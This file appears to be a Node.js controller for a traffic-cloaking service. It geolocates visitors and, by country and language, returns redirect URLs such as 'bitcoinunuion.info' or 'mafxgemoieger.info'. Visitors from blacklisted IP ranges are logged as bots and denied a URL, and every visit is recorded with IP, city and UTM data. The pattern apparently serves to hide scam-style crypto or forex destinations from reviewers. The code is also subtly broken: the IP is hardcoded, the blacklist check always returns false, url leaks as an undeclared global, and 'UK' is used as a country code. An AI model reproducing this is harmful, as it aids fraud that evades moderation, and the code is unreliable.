const geoip = require('geoip-lite');
const ip6addr = require('ip6addr');
const Address6 = require('ip-address').Address6;
const Ip = require('../models/IpAddress');
const User = require('../models/User');
const errorHandler = require('../utils/errorHandler');

module.exports.getUrl = async function (req, res) {
    try {
        // let ip = req.ip
        // let ip = "114.104.182.143"
        let ip = "5.182.39.255"
        // let ip = "2a03:2880:f122::"
        if (ip6addr.parse(ip).kind() === 'ipv6') {
            ip = new Address6(ip).inspectTeredo().server4;
        }
        if (ip.substr(0, 7) === "::ffff:") {
            ip = ip.substr(7)
        }
        let data = checkCountry(ip, req.body.language);
        let unique;
        const uniqueUser = await User.findOne({ip})
        if (uniqueUser) {
            unique = 0
        } else {
            unique = 1
        }
        const allBlackIp = await Ip.find({})
        const block = parceIpForCompare(ip, allBlackIp);
        let date = new Date(Date.now()).toString();
        if (block) {
            const user = new User({
                UserAgent: req.body.UserAgent,
                UTM: req.body.UTM,
                reason: 'This ip is in black list!',
                language: req.body.language,
                url: null,
                ip,
                country: data.countryCode,
                city: data.city,
                bot: 1,
                unique,
                dataTime: date
            });
            await user.save()
            res.status(200).json(false)
        } else {
            let reason = null
            if (data.url === null) {
                reason = 'Invalid country'
                res.status(200).json(false)
            } else {
                res.status(200).json({
                    status: true,
                    url
                })
            }
            const user = new User({
                UserAgent: req.body.UserAgent,
                UTM: req.body.UTM,
                reason: reason,
                language: req.body.language,
                url: data.url,
                ip,
                country: data.countryCode,
                city: data.city,
                bot: 0,
                unique,
                dataTime: date
            });
            await user.save()
        }

    } catch (e) {
        errorHandler(res, e)
    }
}

function checkCountry(ip, language) {
    let geo = geoip.lookup(ip);
    let countryCode;
    let city;
    if (geo === null) {
        url = null;
        countryCode = null;
        city = null;
    } else {
        countryCode = geo.country;
        city = geo.city;
        switch (geo.country) {
            case "CN":
                url = 'bitcoinunuion.info'
                break
            case "UK":
                url = 'bitcoinunuion.info'
                break
            case "AU":
                url = 'bitcoinunuion.info'
                break
            case "SG":
                url = 'bitcoinunuion.info'
                break
            case "PL":
                url = 'mafxgemoieger.info'
                break
            case "RU":
                url = 'mafxgemoieger.info'
                break
            case "UA":
                url = 'mafxgemoieger.info'
                break
            default:
                url = null;
                break
        }

    }
    if (countryCode === 'RU' || countryCode === "UA" || countryCode === "PL") {
        if (language ==='RU' ||
            language ==='UA' ||
            language ==='PL') {
            url = 'mafxgemoieger.info'
            } else {
            url = null
        }
    }

    return {url, countryCode, city}
}

function parceIpForCompare(ip, allBlackIp) {
    let newIp = ip.split('.').map(item => {
        if ((item.length < 1)) return item = '000'
        if (item.length === 1) return item = '00' + item
        if (item.length === 2) return item = '0' + item
        if (item.length === 3 || item.length > 3) return item
    })
    return compareIp(newIp.join(''), allBlackIp)
}

function compareIp(ip, allBlackIp) {
    let block = false;
    allBlackIp.map(item => {
        if (item.firstDiapason <= ip && item.secondDiapason >= ip &&
            item.firstDiapason !== '000000000000' &&
            item.secondDiapason !== '255255255255') {
            block = true
        }
    })
    // return block
    return false
}